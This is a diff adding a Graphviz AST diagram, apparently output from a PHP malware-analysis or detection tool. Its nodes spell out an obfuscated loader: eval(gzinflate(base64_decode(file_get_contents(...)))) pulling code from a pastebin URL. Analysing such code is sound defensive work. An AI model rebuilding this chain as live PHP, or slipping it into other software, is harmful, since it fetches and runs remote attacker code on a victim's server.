@@ -1,0 +1,38 @@
+digraph ast {
+node [shape=none];
+219080590 [label=<<TABLE border='1' cellspacing='0' cellpadding='10' style='rounded' ><TR><TD border='0'>219080590</TD><TD border='0'><B>Argument</B></TD></TR></TABLE>>];
+219080590 -> 219080588 [weight=2];
+219080591 [label=<<TABLE border='1' cellspacing='0' cellpadding='10' style='rounded' ><TR><TD border='0'>219080591</TD><TD border='0'><B>FunctionCall</B></TD></TR><HR/><TR><TD border='0' cellpadding='5' colspan='2'>file_get_contents</TD></TR></TABLE>>];
+219080591 -> 219080587 [weight=2];
+219080591 -> 219080589 [weight=2];
+219080588 [label=<<TABLE border='1' cellspacing='0' cellpadding='10' style='rounded' ><TR><TD border='0'>219080588</TD><TD border='0'><B>StringLiteral</B></TD></TR><HR/><TR><TD border='0' cellpadding='5' colspan='2'>https:pastebin.comrawW90fAFZj</TD></TR></TABLE>>];
+219080589 [label=<<TABLE border='1' cellspacing='0' cellpadding='10' style='rounded' ><TR><TD border='0'>219080589</TD><TD border='0'><B>ArgumentList</B></TD></TR></TABLE>>];
+219080589 -> 219080590 [weight=2];
+219080586 [label=<<TABLE border='1' cellspacing='0' cellpadding='10' style='rounded' ><TR><TD border='0'>219080586</TD><TD border='0'><B>Id</B></TD></TR><HR/><TR><TD border='0' cellpadding='5' colspan='2'>base64_decode</TD></TR></TABLE>>];
+219080587 [label=<<TABLE border='1' cellspacing='0' cellpadding='10' style='rounded' ><TR><TD border='0'>219080587</TD><TD border='0'><B>Id</B></TD></TR><HR/><TR><TD border='0' cellpadding='5' colspan='2'>file_get_contents</TD></TR></TABLE>>];
+219080584 [label=<<TABLE border='1' cellspacing='0' cellpadding='10' style='rounded' ><TR><TD border='0'>219080584</TD><TD border='0'><B>Id</B></TD></TR><HR/><TR><TD border='0' cellpadding='5' colspan='2'>eval</TD></TR></TABLE>>];
+219080585 [label=<<TABLE border='1' cellspacing='0' cellpadding='10' style='rounded' ><TR><TD border='0'>219080585</TD><TD border='0'><B>Id</B></TD></TR><HR/><TR><TD border='0' cellpadding='5' colspan='2'>gzinflate</TD></TR></TABLE>>];
+219080600 [label=<<TABLE border='1' cellspacing='0' cellpadding='10' style='rounded' ><TR><TD border='0'>219080600</TD><TD border='0'><B>FunctionCall</B></TD></TR><HR/><TR><TD border='0' cellpadding='5'>Patterns</TD><TD border='0' cellpadding='5'>[27]</TD></TR><HR/><TR><TD border='0' cellpadding='5' colspan='2'>eval</TD></TR></TABLE>>];
+219080600 -> 219080584 [weight=2];
+219080600 -> 219080598 [weight=2];
+219080598 [label=<<TABLE border='1' cellspacing='0' cellpadding='10' style='rounded' ><TR><TD border='0'>219080598</TD><TD border='0'><B>ArgumentList</B></TD></TR></TABLE>>];
+219080598 -> 219080599 [weight=2];
+219080599 [label=<<TABLE border='1' cellspacing='0' cellpadding='10' style='rounded' ><TR><TD border='0'>219080599</TD><TD border='0'><B>Argument</B></TD></TR></TABLE>>];
+219080599 -> 219080597 [weight=2];
+219080596 [label=<<TABLE border='1' cellspacing='0' cellpadding='10' style='rounded' ><TR><TD border='0'>219080596</TD><TD border='0'><B>Argument</B></TD></TR></TABLE>>];
+219080596 -> 219080594 [weight=2];
+219109621 [label=<<TABLE border='1' cellspacing='0' cellpadding='10' style='rounded' bgcolor='#FFCCCC' ><TR><TD border='0'>219109621</TD><TD border='0'><B>DecodeFailed</B></TD></TR><HR/><TR><TD border='0' cellpadding='5' colspan='2'>FuncIdUnknown</TD></TR></TABLE>>];
+219080597 [label=<<TABLE border='1' cellspacing='0' cellpadding='10' style='rounded' ><TR><TD border='0'>219080597</TD><TD border='0'><B>FunctionCall</B></TD></TR><HR/><TR><TD border='0' cellpadding='5' colspan='2'>gzinflate</TD></TR></TABLE>>];
+219080597 -> 219080585 [weight=2];
+219080597 -> 219080595 [weight=2];
+219080594 [label=<<TABLE border='1' cellspacing='0' cellpadding='10' style='rounded' ><TR><TD border='0'>219080594</TD><TD border='0'><B>FunctionCall</B></TD></TR><HR/><TR><TD border='0' cellpadding='5' colspan='2'>base64_decode</TD></TR></TABLE>>];
+219080594 -> 219080586 [weight=2];
+219080594 -> 219080592 [weight=2];
+219080595 [label=<<TABLE border='1' cellspacing='0' cellpadding='10' style='rounded' ><TR><TD border='0'>219080595</TD><TD border='0'><B>ArgumentList</B></TD></TR></TABLE>>];
+219080595 -> 219080596 [weight=2];
+219080592 [label=<<TABLE border='1' cellspacing='0' cellpadding='10' style='rounded' ><TR><TD border='0'>219080592</TD><TD border='0'><B>ArgumentList</B></TD></TR></TABLE>>];
+219080592 -> 219080593 [weight=2];
+219080593 [label=<<TABLE border='1' cellspacing='0' cellpadding='10' style='rounded' ><TR><TD border='0'>219080593</TD><TD border='0'><B>Argument</B></TD></TR></TABLE>>];
+219080593 -> 219080591 [weight=2];
+219080593 -> 219109621 [style=dotted,label=DynamicResolution];
+}
